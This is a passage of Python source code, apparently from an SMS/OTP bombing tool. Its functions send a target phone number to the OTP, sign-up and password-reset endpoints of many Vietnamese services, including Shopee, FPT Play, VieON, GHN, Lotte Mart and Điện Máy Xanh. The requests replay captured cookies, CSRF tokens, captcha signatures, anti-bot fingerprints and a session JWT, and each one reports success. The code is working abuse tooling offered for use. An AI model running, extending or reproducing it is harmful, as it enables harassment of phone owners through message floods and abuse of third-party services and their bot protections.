        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1722324791163',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    print('thành Công') #("Viettel OTP TV360:", response.text)



# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def send_otp_via_dienmayxanh(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2690|Zqilx|Zqilw',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM',
        'DMX_Personal': '%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2690|Zqilx|Zqilw; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM; DMX_Personal=%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        'DNT': '1',
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
        verify=False,
    )

    print('thành Công') #("OTP SEND ĐIỆN MÁY XANH:", response.text)



def send_otp_via_kingfoodmart(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=100)


    print("OTP SEND kingfoodmart:", response.text)


def send_otp_via_mocha(sdt):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
        # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    params = {
    'msisdn': sdt,
    'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)


    print('thành Công') #("OTP SEND modcha:", response.json)

def send_otp_via_fptdk(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-did': 'A0EB7FD5EA287DBF',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND FPT Đăng ký: đã gửi ")

def send_otp_via_fptmk(sdt): # là quên pass ở fps á
    cookies = {
        'auth.strategy': '',
        'expire_welcome': '14400',
        'fpt_uuid': '%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22',
        'ajs_group_id': 'null',
        'G_ENABLED_IDPS': 'google',
        'CDP_ANONYMOUS_ID': '1722362340735',
        'CDP_USER_ID': '1722362340735',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'auth.strategy=; expire_welcome=14400; fpt_uuid=%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22; ajs_group_id=null; G_ENABLED_IDPS=google; CDP_ANONYMOUS_ID=1722362340735; CDP_USER_ID=1722362340735',
        'dnt': '1',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'script',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    response = requests.get(
        'https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js',
        cookies=cookies,
        headers=headers,
    )


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-did': 'A0EB7FD5EA287DBF',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND FPT Quên pass: Đã gửi ")


def send_otp_via_VIEON(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
        'device_name': 'Edge/127',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
    print('thành Công') #("OTP SEND VIEON:", response.text)

def send_otp_via_ghn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND GHN EXPRESS :", response.text)


def send_otp_via_lottemart(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=14b2514d94fe41605786ef086cffbab297d54c010cdb62c54bc8dad4c84f17ce%7Cf56d91c5542867ff5e83a10d7b0c0b481903f9dfa0917700d5b96641511dd8d8; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'dnt': '1',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND SPEED LOTTE:", response.text)





def send_otp_via_DONGCRE(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND DONGCRE:", response.text)






def send_otp_via_shopee(sdt):
    cookies = {
        '_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
        'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
        'SPC_F': 'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
        'REC_T_ID': '23f51dde-355f-11ef-bcef-3eebbabc6162',
        'SPC_R_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_R_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        'SPC_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        '__LOCALE__null': 'VN',
        'csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'SPC_SI': 'p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=',
        'SPC_SEC_SI': 'v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=',
        '_sapid': '1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'af-ac-enc-dat': '438deef2a644b9a6',
        'af-ac-enc-sz-token': '',
        'content-type': 'application/json',
        # 'cookie': '_QPWSDCXHZQA=e7d49dd0-6ed7-4de5-a3d4-a5dddf426740; REC7iLP4Q=312bf815-7526-4121-82bf-61c29691b57f; SPC_F=eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq; REC_T_ID=23f51dde-355f-11ef-bcef-3eebbabc6162; SPC_R_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_R_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; SPC_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; __LOCALE__null=VN; csrftoken=PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs; SPC_SI=p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=; SPC_SEC_SI=v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=; _sapid=1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
        'dnt': '1',
        'origin': 'https://shopee.vn',
        'priority': 'u=1, i',
        'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-source': 'pc',
        'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'x-requested-with': 'XMLHttpRequest',
        'x-sap-ri': '22d9a8667b497dfe94c089340401498ec675997cbc5522816f11',
        'x-sap-sec': 'u476ZVItP6d5d4mjdbAXdgcjKHFhdxPj2bFOdZcj/6FRdZtjMbFndaJjNbFXdbcjQ6FYdbZjdbTKdgmj1HTVdihjXbTXdjLjDbTzdjUjGbAsdlmjYbA/dm3jZbA2dmmjabAVdyJjjbAXdzcjlbAzdzFjhHDpdCGjobD/dG3jEbDQdGZjHVDNdYLjObDDdYZjkbDbdwejIVDzdwUjLbAXdbFjdbA4pbTIj2Vwd6Fj0btjdycgdbAexbTfQbtjdbFjdYuMg3R2dbAfu+JgdbFjdbFicmAmm6FOr4gV0FVMdbTFRTFgdbFjGVM7BbUjdmmjdbFjdbJOjbFjdbFjdgp5d6FjdwnL2dnfehPjdbsORbUjdbFjdffRd6FjdbFjgFDdVQSzd6Fjnb8jdwFgdbFud6FjsbUjdzNzZqlVd6Fjvb8jdlFidbA2d6FjP1U0zzmgdbFuUwR1dbFjUEMSOBFjdZ04ObUjdaSwN7JjdbFlmb8jdfFidbFjdbTccbUjdbFjdbiAdVFjdbFj06mjdbTd7kdDOV8jdzb1b1qqfGpdmLdIqAAKbRL2SgDbBNg6B3nVd7kGR7z4+wJ7/SSwEScz+iqxyMwILgB12leqy9yJfu70zqiQnIK2ygQtEcp6oSZ42fKlHdCQVg5R19dNKIZ6UIIK0AzVwJsXTLbqq3J/i8rgxRmTn+rOOQG40bhL70hPMPRhbJAC+M0yWItYBwrvGjS4PdAPtn5ioTpEKu4zqw6ogq5Dc+AJpdsvRWZB71oRp6qeur1aMxYkXHiYukh88xRrpj+t5K+OndYJeXfMScjRaYcUbZItYcOAvG3gacwmnxPK9FVwLgq+pD0M3UxDWWEF3VrG1lEjFX8fe8CLeRmb9f7OmN78WcxxPrkRQp6oDTgiEgC8cLXyfNziJj26Ehw72GpZfVQTL83eiqN9PyHYVVdgBXRDzUlt2ZrTkam6CP9G0lNtX3EIzhx0zPNMjqianyiQlzOVpAePiwIH/6FjdbmjdbF4RkZoRbFjdGMmX/PwdbFjShlMH/8O2LUjdbFjQbFjdCetJ6y/XoLodbFjdbFjdbFldbFj4qNrSSX+3bFbdbFj6HTr22kcoV8pR8LkdbFjdbUjdbDaEVFjd6FjdwDhdbFzdbFjs0N2S6FjdbFzdbFjMRwF6HmjdbAwW0FyRbFjdfdtkbgwdbFj92xLl1DrRHgwdbFj2EfR0xPP0EJjdbFjQbFjdaZ586CeX0LoRbFjdzqIPjMgdbFjzOGjdbUjdbAjuHFjRbFjdzqIPjMwdbFj2vF4HLfdStgjdbFjQbFjdz9mxU80RDtYRbFjdfJ2+QgfdbFj/t8XdbJjdbFI2hl+KvZ426FjdbD=',
        'x-shopee-language': 'vi',
        'x-sz-sdk-version': '1.10.12',
    }

    json_data = {
        'operation': 8,
        'encrypted_phone': '',
        'phone': sdt,
        'supported_channels': [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        'support_session': True,
    }

    response = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', cookies=cookies, headers=headers, json=json_data)


    print('thành Công') #("OTP SEND shopee:", response.text)



def send_otp_via_TGDD(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'beline173|ZqjdK|ZqjdJ',
